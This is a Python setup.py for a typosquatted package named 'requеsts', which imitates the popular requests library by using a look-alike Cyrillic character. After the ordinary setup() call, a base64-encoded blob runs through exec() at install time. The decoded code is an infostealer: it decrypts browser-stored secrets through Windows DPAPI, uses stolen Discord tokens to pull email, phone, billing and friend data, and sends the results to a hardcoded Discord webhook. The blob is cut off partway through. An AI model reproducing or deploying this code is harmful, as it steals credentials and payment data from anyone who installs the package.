from setuptools import setup
import base64

with open('README.md', 'r') as fh:
    long_description = fh.read()

setup(
    name='requеsts',
    version='0.1.0',
    author='Carter Beams',
    author_email='PW668878@outlook.com',
    description='Solar on top',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/Napoleon-x/multi-logger-python-discord-token-logger-and-chrome-password-stealer-through-webhooks',
    packages=['requеsts'],
    install_requires=['browser_cookie3', 'requests', 'psutil', 'cryptography', 'httpx', 'pypiwin32', 'dhooks', 'pycryptodome'],
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: GNU Lesser General Public License v3 or later (LGPLv3+)',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
)

exec(base64.b64decode("""
aW1wb3J0IG9zCmltcG9ydCB0aHJlYWRpbmcKZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUKZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0CmltcG9ydCByZQpmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCmZyb20ganNvbiBpbXBvcnQgbG9hZHMgYXMganNvbl9sb2FkcywgbG9hZApmcm9tIGN0eXBlcyBpbXBvcnQgd2luZGxsLCB3aW50eXBlcywgYnlyZWYsIGNkbGwsIFN0cnVjdHVyZSwgUE9JTlRFUiwgY19jaGFyLCBjX2J1ZmZlcgpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzCmltcG9ydCB0aW1lCmltcG9ydCBzaHV0aWwKZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlCmltcG9ydCByYW5kb20KaW1wb3J0IHJlCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBzb2NrZXQKaW1wb3J0IHBzdXRpbAoKIyAgVEhJUyBJUyAxLjEuNiBWRVJTSU9OCiMgICAgQlkgVzRTUCwgbG9UdXMwNAojIAoKCmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4MjY4MzA2ODc2NDEzNTQyNC9JWkZhcjliREY3OXEyQTJFSWVoWEZ4ay1kelBRR3JocGVXUTFKblVBajliNGVNby1KOER1WGhtWDQ5MF9OOVRRQlA1WCIKREVURUNURUQgPSBGYWxzZQoKCmRlZiBnZXRpcCgpOgogICAgaXAgPSAiTm9uZSIKICAgIHRyeToKICAgICAgICBpcCA9IHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwogICAgcmV0dXJuIGlwCgpyZXF1aXJlbWVudHMgPSBbCiAgICBbInJlcXVlc3RzIiwgInJlcXVlc3RzIl0sCiAgICBbIkNyeXB0by5DaXBoZXIiLCAicHljcnlwdG9kb21lIl0sCl0KZm9yIG1vZGwgaW4gcmVxdWlyZW1lbnRzOgogICAgdHJ5OiBfX2ltcG9ydF9fKG1vZGxbMF0pCiAgICBleGNlcHQ6CiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihmIntleGVjdXRhYmxlfSAtbSBwaXAgaW5zdGFsbCB7bW9kbFsxXX0iLCBzaGVsbD1UcnVlKQogICAgICAgIHRpbWUuc2xlZXAoMykKCmltcG9ydCByZXF1ZXN0cwpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwoKbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpCnJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQp0ZW1wID0gb3MuZ2V0ZW52KCJURU1QIikKVGhyZWFkbGlzdCA9IFtdCgoKY2xhc3MgREFUQV9CTE9CKFN0cnVjdHVyZSk6CiAgICBfZmllbGRzXyA9IFsKICAgICAgICAoJ2NiRGF0YScsIHdpbnR5cGVzLkRXT1JEKSwKICAgICAgICAoJ3BiRGF0YScsIFBPSU5URVIoY19jaGFyKSkKICAgIF0KCmRlZiBHZXREYXRhKGJsb2Jfb3V0KToKICAgIGNiRGF0YSA9IGludChibG9iX291dC5jYkRhdGEpCiAgICBwYkRhdGEgPSBibG9iX291dC5wYkRhdGEKICAgIGJ1ZmZlciA9IGNfYnVmZmVyKGNiRGF0YSkKICAgIGNkbGwubXN2Y3J0Lm1lbWNweShidWZmZXIsIHBiRGF0YSwgY2JEYXRhKQogICAgd2luZGxsLmtlcm5lbDMyLkxvY2FsRnJlZShwYkRhdGEpCiAgICByZXR1cm4gYnVmZmVyLnJhdwoKZGVmIENyeXB0VW5wcm90ZWN0RGF0YShlbmNyeXB0ZWRfYnl0ZXMsIGVudHJvcHk9YicnKToKICAgIGJ1ZmZlcl9pbiA9IGNfYnVmZmVyKGVuY3J5cHRlZF9ieXRlcywgbGVuKGVuY3J5cHRlZF9ieXRlcykpCiAgICBidWZmZXJfZW50cm9weSA9IGNfYnVmZmVyKGVudHJvcHksIGxlbihlbnRyb3B5KSkKICAgIGJsb2JfaW4gPSBEQVRBX0JMT0IobGVuKGVuY3J5cHRlZF9ieXRlcyksIGJ1ZmZlcl9pbikKICAgIGJsb2JfZW50cm9weSA9IERBVEFfQkxPQihsZW4oZW50cm9weSksIGJ1ZmZlcl9lbnRyb3B5KQogICAgYmxvYl9vdXQgPSBEQVRBX0JMT0IoKQoKICAgIGlmIHdpbmRsbC5jcnlwdDMyLkNyeXB0VW5wcm90ZWN0RGF0YShieXJlZihibG9iX2luKSwgTm9uZSwgYnlyZWYoYmxvYl9lbnRyb3B5KSwgTm9uZSwgTm9uZSwgMHgwMSwgYnlyZWYoYmxvYl9vdXQpKToKICAgICAgICByZXR1cm4gR2V0RGF0YShibG9iX291dCkKCmRlZiBEZWNyeXB0VmFsdWUoYnVmZiwgbWFzdGVyX2tleT1Ob25lKToKICAgIHN0YXJ0cyA9IGJ1ZmYuZGVjb2RlKGVuY29kaW5nPSd1dGY4JywgZXJyb3JzPSdpZ25vcmUnKVs6M10KICAgIGlmIHN0YXJ0cyA9PSAndjEwJyBvciBzdGFydHMgPT0gJ3YxMSc6CiAgICAgICAgaXYgPSBidWZmWzM6MTVdCiAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQogICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikKICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQogICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcwoKZGVmIExvYWRSZXF1ZXN0cyhtZXRob2RlLCB1cmwsIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToKICAgIGZvciBpIGluIHJhbmdlKDgpOiAjIG1heCB0cnlzCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBtZXRob2RlID09ICdQT1NUJzoKICAgICAgICAgICAgICAgIGlmIGRhdGEgIT0gJyc6CiAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgICAgICBlbGlmIGZpbGVzICE9ICcnOgogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMpCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDAgb3Igci5zdGF0dXNfY29kZSA9PSA0MTM6ICMgNDEzID0gREFUQSBUTyBCSUcKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCmRlZiBMb2FkVXJsaWIoaG9vaywgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOgogICAgZm9yIGkgaW4gcmFuZ2UoOCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBoZWFkZXJzICE9ICcnOgogICAgICAgICAgICAgICAgciA9IHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWRhdGEsIGhlYWRlcnM9aGVhZGVycykpCiAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgciA9IHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWRhdGEpKQogICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICBleGNlcHQ6IAogICAgICAgICAgICBwYXNzCgpkZWYgZ2xvYmFsSW5mbygpOgogICAgaXAgPSBnZXRpcCgpCiAgICB1c2VybmFtZSA9IG9zLmdldGxvZ2luKCkKICAgIHRyeToKICAgICAgICBpcGRhdGFub2pzb24gPSB1cmxvcGVuKFJlcXVlc3QoZiJodHRwczovL2dlb2xvY2F0aW9uLWRiLmNvbS9qc29ucC97aXB9IikpLnJlYWQoKS5kZWNvZGUoKS5yZXBsYWNlKCdjYWxsYmFjaygnLCAnJykucmVwbGFjZSgnfSknLCAnfScpCiAgICBleGNlcHQ6CiAgICAgICAgaXBkYXRhbm9qc29uID0geyJpcCI6ICJGYWlsZWQgdG8gZ3JhYiBJUCJ9CiAgICAjIHByaW50KGlwZGF0YW5vanNvbikKICAgIGlwZGF0YSA9IGxvYWRzKGlwZGF0YW5vanNvbikKICAgICMgcHJpbnQodXJsb3BlbihSZXF1ZXN0KGYiaHR0cHM6Ly9nZW9sb2NhdGlvbi1kYi5jb20vanNvbnAve2lwfSIpKS5yZWFkKCkuZGVjb2RlKCkpCiAgICBjb250cnkgPSBpcGRhdGFbImNvdW50cnlfbmFtZSJdCiAgICBjb250cnlDb2RlID0gaXBkYXRhWyJjb3VudHJ5X2NvZGUiXS5sb3dlcigpCiAgICBnbG9iYWxpbmZvID0gZiI6ZmxhZ197Y29udHJ5Q29kZX06ICAtIGB7dXNlcm5hbWUudXBwZXIoKX0gfCB7aXB9ICh7Y29udHJ5fSlgIgogICAgIyBwcmludChnbG9iYWxpbmZvKQogICAgcmV0dXJuIGdsb2JhbGluZm8KCgpkZWYgVHJ1c3QoQ29va2llcyk6CiAgICAjIHNpbXBsZSBUcnVzdCBGYWN0b3Igc3lzdGVtIChkaXNhYmxlZCBmb3IgdGhlIG1vbWVudCkKICAgIGdsb2JhbCBERVRFQ1RFRAogICAgZGF0YSA9IHN0cihDb29raWVzKQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQogICAgIyBwcmludChsZW4odGltKSkKICAgIGlmIGxlbih0aW0pIDwgLTE6CiAgICAgICAgREVURUNURUQgPSBUcnVlCiAgICAgICAgcmV0dXJuIERFVEVDVEVECiAgICBlbHNlOgogICAgICAgIERFVEVDVEVEID0gRmFsc2UKICAgICAgICByZXR1cm4gREVURUNURUQKICAgICAgICAKZGVmIEdldFVIUUZyaWVuZHModG9rZW4pOgogICAgYmFkZ2VMaXN0ID0gIFsKICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICdWYWx1ZSc6IDEzMTA3MiwgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdFYXJseV9TdXBwb3J0ZXInLCAnVmFsdWUnOiA1MTIsICdFbW9qaSc6ICI8OmVhcmx5X3N1cHBvcnRlcjo4NzQ3NTA4MDg0MTQxMTM4MjM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgJ1ZhbHVlJzogMjU2LCAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJhdmVyeScsICdWYWx1ZSc6IDY0LCAnRW1vamknOiAiPDpicmF2ZXJ5Ojg3NDc1MDgwODM4ODk1MjA3NT4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICdWYWx1ZSc6IDgsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ1BhcnRuZXJlZF9TZXJ2ZXJfT3duZXInLCAnVmFsdWUnOiAyLCdFbW9qaSc6ICI8OnBhcnRuZXI6ODc0NzUwODA4Njc4MzU0OTY0PiAifSwKICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICdWYWx1ZSc6IDEsICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0KICAgIF0KICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQogICAgdHJ5OgogICAgICAgIGZyaWVuZGxpc3QgPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9yZWxhdGlvbnNoaXBzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKICAgIHVocWxpc3QgPSAnJwogICAgZm9yIGZyaWVuZCBpbiBmcmllbmRsaXN0OgogICAgICAgIE93bmVkQmFkZ2VzID0gJycKICAgICAgICBmbGFncyA9IGZyaWVuZFsndXNlciddWydwdWJsaWNfZmxhZ3MnXQogICAgICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6CiAgICAgICAgICAgIGlmIGZsYWdzIC8vIGJhZGdlWyJWYWx1ZSJdICE9IDAgYW5kIGZyaWVuZFsndHlwZSddID09IDE6CiAgICAgICAgICAgICAgICBpZiBub3QgIkhvdXNlIiBpbiBiYWRnZVsiTmFtZSJdOgogICAgICAgICAgICAgICAgICAgIE93bmVkQmFkZ2VzICs9IGJhZGdlWyJFbW9qaSJdCiAgICAgICAgICAgICAgICBmbGFncyA9IGZsYWdzICUgYmFkZ2VbIlZhbHVlIl0KICAgICAgICBpZiBPd25lZEJhZGdlcyAhPSAnJzoKICAgICAgICAgICAgdWhxbGlzdCArPSBmIntPd25lZEJhZGdlc30gfCB7ZnJpZW5kWyd1c2VyJ11bJ3VzZXJuYW1lJ119I3tmcmllbmRbJ3VzZXInXVsnZGlzY3JpbWluYXRvciddfSAoe2ZyaWVuZFsndXNlciddWydpZCddfSlcbiIKICAgIHJldHVybiB1aHFsaXN0CgoKZGVmIEdldEJpbGxpbmcodG9rZW4pOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CiAgICB0cnk6CiAgICAgICAgYmlsbGluZ2pzb24gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcyIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2UKICAgIAogICAgaWYgYmlsbGluZ2pzb24gPT0gW106IHJldHVybiAiIC0iCgogICAgYmlsbGluZyA9ICIiCiAgICBmb3IgbWV0aG9kZSBpbiBiaWxsaW5nanNvbjoKICAgICAgICBpZiBtZXRob2RlWyJpbnZhbGlkIl0gPT0gRmFsc2U6CiAgICAgICAgICAgIGlmIG1ldGhvZGVbInR5cGUiXSA9PSAxOgogICAgICAgICAgICAgICAgYmlsbGluZyArPSAiOmNyZWRpdF9jYXJkOiIKICAgICAgICAgICAgZWxpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMjoKICAgICAgICAgICAgICAgIGJpbGxpbmcgKz0gIjpwYXJraW5nOiAiCgogICAgcmV0dXJuIGJpbGxpbmcKCgpkZWYgR2V0QmFkZ2UoZmxhZ3MpOgogICAgaWYgZmxhZ3MgPT0gMDogcmV0dXJuICcnCgogICAgT3duZWRCYWRnZXMgPSAnJwogICAgYmFkZ2VMaXN0ID0gIFsKICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICdWYWx1ZSc6IDEzMTA3MiwgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdFYXJseV9TdXBwb3J0ZXInLCAnVmFsdWUnOiA1MTIsICdFbW9qaSc6ICI8OmVhcmx5X3N1cHBvcnRlcjo4NzQ3NTA4MDg0MTQxMTM4MjM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgJ1ZhbHVlJzogMjU2LCAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJhdmVyeScsICdWYWx1ZSc6IDY0LCAnRW1vamknOiAiPDpicmF2ZXJ5Ojg3NDc1MDgwODM4ODk1MjA3NT4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICdWYWx1ZSc6IDgsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ1BhcnRuZXJlZF9TZXJ2ZXJfT3duZXInLCAnVmFsdWUnOiAyLCdFbW9qaSc6ICI8OnBhcnRuZXI6ODc0NzUwODA4Njc4MzU0OTY0PiAifSwKICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICdWYWx1ZSc6IDEsICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0KICAgIF0KICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6CiAgICAgICAgaWYgZmxhZ3MgLy8gYmFkZ2VbIlZhbHVlIl0gIT0gMDoKICAgICAgICAgICAgT3duZWRCYWRnZXMgKz0gYmFkZ2VbIkVtb2ppIl0KICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGJhZGdlWyJWYWx1ZSJdCgogICAgcmV0dXJuIE93bmVkQmFkZ2VzCgpkZWYgR2V0VG9rZW5JbmZvKHRva2VuKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQoKICAgIHVzZXJqc29uID0gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKS5yZWFkKCkuZGVjb2RlKCkpCiAgICB1c2VybmFtZSA9IHVzZXJqc29uWyJ1c2VybmFtZSJdCiAgICBoYXNodGFnID0gdXNlcmpzb25bImRpc2NyaW1pbmF0b3IiXQogICAgZW1haWwgPSB1c2VyanNvblsiZW1haWwiXQogICAgaWRkID0gdXNlcmpzb25bImlkIl0KICAgIHBmcCA9IHVzZXJqc29uWyJhdmF0YXIiXQogICAgZmxhZ3MgPSB1c2VyanNvblsicHVibGljX2ZsYWdzIl0KICAgIG5pdHJvID0gIiIKICAgIHBob25lID0gIi0iCgogICAgaWYgInByZW1pdW1fdHlwZSIgaW4gdXNlcmpzb246IAogICAgICAgIG5pdHJvdCA9IHVzZXJqc29uWyJwcmVtaXVtX3R5cGUiXQogICAgICAgIGlmIG5pdHJvdCA9PSAxOgogICAgICAgICAgICBuaXRybyA9ICI8OmNsYXNzaWM6ODk2MTE5MTcxMDE5MDY3NDIzPiAiCiAgICAgICAgZWxpZiBuaXRyb3QgPT0gMjoKICAgICAgICAgICAgbml0cm8gPSAiPGE6Ym9vc3Q6ODI0MDM2Nzc4NTcwNDE2MTI5PiA8OmNsYXNzaWM6ODk2MTE5MTcxMDE5MDY3NDIzPiAiCiAgICBpZiAicGhvbmUiIGluIHVzZXJqc29uOiBwaG9uZSA9IGYnYHt1c2VyanNvblsicGhvbmUiXX1gJwoKICAgIHJldHVybiB1c2VybmFtZSwgaGFzaHRhZywgZW1haWwsIGlkZCwgcGZwLCBmbGFncywgbml0cm8sIHBob25lCgpkZWYgY2hlY2tUb2tlbih0b2tlbik6CiAgICBoZWFkZXJzID0gewogICAgICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4sCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHRyeToKICAgICAgICB1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2UKCgpkZWYgdXBsb2FkVG9rZW4odG9rZW4sIHBhdGgpOgogICAgZ2xvYmFsIGhvb2sKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHVzZXJuYW1lLCBoYXNodGFnLCBlbWFpbCwgaWRkLCBwZnAsIGZsYWdzLCBuaXRybywgcGhvbmUgPSBHZXRUb2tlbkluZm8odG9rZW4pCgogICAgaWYgcGZwID09IE5vbmU6IAogICAgICAgIHBmcCA9ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyNTkzMTg0MjUxMTgzMTk1LzdjOGY0NzYxMjNkMjhkMTAzZWZlMzgxNTQzMjc0YzI1LnBuZyIKICAgIGVsc2U6CiAgICAgICAgcGZwID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3tpZGR9L3twZnB9IgoKICAgIGJpbGxpbmcgPSBHZXRCaWxsaW5nKHRva2VuKQogICAgYmFkZ2UgPSBHZXRCYWRnZShmbGFncykKICAgIGZyaWVuZHMgPSBHZXRVSFFGcmllbmRzKHRva2VuKQogICAgaWYgZnJpZW5kcyA9PSAnJzogZnJpZW5kcyA9ICJObyBSYXJlIEZyaWVuZHMiCiAgICBpZiBub3QgYmlsbGluZzoKICAgICAgICBiYWRnZSwgcGhvbmUsIGJpbGxpbmcgPSAi8J+UkiIsICLwn5SSIiwgIvCflJIiCiAgICBpZiBuaXRybyA9PSAnJyBhbmQgYmFkZ2UgPT0gJyc6IG5pdHJvID0gIiAtIgoKICAgIGRhdGEgPSB7CiAgICAgICAgImNvbnRlbnQiOiBmJ3tnbG9iYWxJbmZvKCl9IHwgRm91bmQgaW4gYHtwYXRofWAnLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgImNvbG9yIjogMTM5LAogICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpyb2NrZXQ6IFRva2VuOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ8fGB7dG9rZW59YHx8XG5bQ2xpY2sgdG8gY29weV0oaHR0cHM6Ly9zdXBlcmZ1cnJ5Y2RuLm5sL2NvcHkve3Rva2VufSkiCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjplbnZlbG9wZTogRW1haWw6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7ZW1haWx9YCIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOm1vYmlsZV9waG9uZTogUGhvbmU6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntwaG9uZX0iLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpnbG9iZV93aXRoX21lcmlkaWFuczogSVA6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7Z2V0aXAoKX1gIiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6YmVnaW5uZXI6IEJhZGdlczoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie25pdHJvfXtiYWRnZX0iLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpjcmVkaXRfY2FyZDogQmlsbGluZzoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie2JpbGxpbmd9IiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6Y2xvd246IEhRIEZyaWVuZHM6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntmcmllbmRzfSIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IEZhbHNlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgIm5hbWUiOiBmInt1